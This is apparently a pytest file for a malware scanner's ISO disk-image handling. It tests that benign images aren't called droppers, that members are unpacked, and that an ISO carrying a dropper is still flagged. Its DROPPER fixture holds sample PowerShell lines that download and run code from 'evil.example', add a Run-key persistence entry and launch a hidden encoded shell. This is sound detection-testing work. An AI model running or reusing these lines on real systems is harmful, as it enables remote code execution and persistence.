"""A disk image carries programs — that is what a disk image is for.

An ISO holding a signed copy of PuTTY came back **malicious 56.6**,
`DiskImage.Dropper.EmbeddedExecutable`, on nothing but the fact that it contained
an executable. Two things were wrong at once, and they pulled in opposite
directions:

**It accused.** Three analyzers each reported the same single fact —
`generic.embedded_executable`, `diskimage.embedded_executable` and
`yara.embedded_pe_in_nonpe` — and each was banded separately, so one observation
contributed three times. Every ISO ever made would trip all three.

**And it never looked.** `children: 0`. The image was not unpacked, so the
verdict about its contents was reached without anything having read them. "There
is an executable inside" was both the whole accusation and the whole
examination.

The second half matters more than the first, and in the other direction: an ISO
is a standard way to smuggle malware past mark-of-the-web, precisely because the
container hides what it holds. Promoting the members to child jobs makes the
container inherit its worst member's verdict, which answers both halves at once.
"""
from __future__ import annotations

import subprocess
import shutil

import pytest

from tests.test_api import _poll_until_done, _submit

DROPPER = (
    b"$c = New-Object Net.WebClient\n"
    b"$c.DownloadFile('http://evil.example/p.exe', \"$env:TEMP\p.exe\")\n"
    b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/s')\n"
    b"New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    b" -Name Upd -Value 'p.exe'\n"
    b"powershell -enc SQBFAFgA -w hidden\n"
)
BENIGN_PE = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 4096
README = b"Release notes.\nNothing interesting here.\n"

_MKISOFS = shutil.which("genisoimage") or shutil.which("mkisofs") or shutil.which("xorriso")
needs_iso_tool = pytest.mark.skipif(_MKISOFS is None, reason="no ISO authoring tool on this host")


def _iso(tmp_path, files: dict[str, bytes]) -> bytes:
    root = tmp_path / "root"
    root.mkdir(exist_ok=True)
    for name, payload in files.items():
        (root / name).write_bytes(payload)
    out = tmp_path / "image.iso"
    if _MKISOFS.endswith("xorriso"):
        cmd = [_MKISOFS, "-as", "mkisofs", "-quiet", "-o", str(out), str(root)]
    else:
        cmd = [_MKISOFS, "-quiet", "-o", str(out), "-J", "-r", str(root)]
    subprocess.run(cmd, check=True, capture_output=True)
    return out.read_bytes()


@needs_iso_tool
def test_an_iso_of_ordinary_software_is_not_a_dropper(client, auth, tmp_path) -> None:
    public_id = _submit(client, auth, "release.iso", _iso(tmp_path, {
        "README.TXT": README, "SETUP.EXE": BENIGN_PE,
    }))
    detail = _poll_until_done(client, auth, public_id)
    assert detail["status"] == "completed", detail.get("error")
    assert detail["verdict"]["verdict"] != "malicious", (
        f"{detail['verdict']['threat_name']} at {detail['final_score']}"
    )


@needs_iso_tool
def test_the_image_is_actually_opened(client, auth, tmp_path) -> None:
    """`children: 0` was the real defect: a verdict about the contents, reached
    without reading them."""
    public_id = _submit(client, auth, "release.iso", _iso(tmp_path, {
        "README.TXT": README, "SETUP.EXE": BENIGN_PE,
    }))
    detail = _poll_until_done(client, auth, public_id)
    names = {c["original_name"] for c in detail.get("children") or []}
    assert names, "the image was described but never opened"
    assert any("README" in n.upper() for n in names), names
    assert any("SETUP" in n.upper() for n in names), names


@needs_iso_tool
def test_an_iso_smuggling_a_dropper_is_still_caught(client, auth, tmp_path) -> None:
    """The direction that matters more. An ISO is a standard way to get a
    payload past mark-of-the-web, so a container that is no longer accused of
    merely carrying a program must still inherit what it actually carries."""
    public_id = _submit(client, auth, "invoice.iso", _iso(tmp_path, {
        "README.TXT": README, "INVOICE.PS1": DROPPER,
    }))
    detail = _poll_until_done(client, auth, public_id)
    assert detail["verdict"]["verdict"] in ("malicious", "suspicious"), detail["verdict"]
    worst = max((c["final_score"] for c in detail.get("children") or []), default=0)
    assert detail["final_score"] >= worst - 0.05, (
        "the container scored below its own worst member"
    )


@needs_iso_tool
def test_a_truncated_image_is_unexamined_not_clean(client, auth, tmp_path) -> None:
    """A directory record names a block and a length, and the sample chose both.
    An extent pointing past the end of the file must not be read, and must not
    be reported as nothing-to-see."""
    data = bytearray(_iso(tmp_path, {"README.TXT": README, "SETUP.EXE": BENIGN_PE}))
    public_id = _submit(client, auth, "cut.iso", bytes(data[: len(data) // 2]))
    detail = _poll_until_done(client, auth, public_id)
    assert detail["status"] == "completed", detail.get("error")
    assert isinstance(detail["final_score"], float)


@needs_iso_tool
def test_a_container_is_not_a_dropper_for_being_a_container(client, auth, tmp_path) -> None:
    """The last thread. Score and members agreed — both clean — while the
    verdict still read `DiskImage.Dropper.EmbeddedExecutable`, because the
    capability model credited "dropper" to any container carrying a program.

    A PDF with an embedded file IS a dropper: that format is a document, and a
    program inside one is there to be run by someone who thought they were
    opening a document. An ISO is not a document.
    """
    public_id = _submit(client, auth, "release.iso", _iso(tmp_path, {
        "README.TXT": README, "SETUP.EXE": BENIGN_PE,
    }))
    detail = _poll_until_done(client, auth, public_id)
    assert "Dropper" not in detail["verdict"]["threat_name"], detail["verdict"]
    worst = max((c["final_score"] for c in detail.get("children") or []), default=0.0)
    assert detail["verdict"]["verdict"] == "clean" or detail["final_score"] <= worst + 0.05, (
        "the container is worse than anything actually in it"
    )


def test_a_document_carrying_a_program_still_is_a_dropper() -> None:
    """The other half, asserted directly so the exemption cannot widen into
    'nothing is ever a dropper'."""
    from app.engine import capabilities

    dropper = capabilities.CAPABILITY_SIGNALS["dropper"]
    assert "pdf.embedded_file" in dropper
    assert "office.embedded_object" in dropper
    assert "generic.embedded_executable" in dropper
    assert "diskimage.embedded_executable" not in dropper
    assert "archive.contains_executable" not in dropper
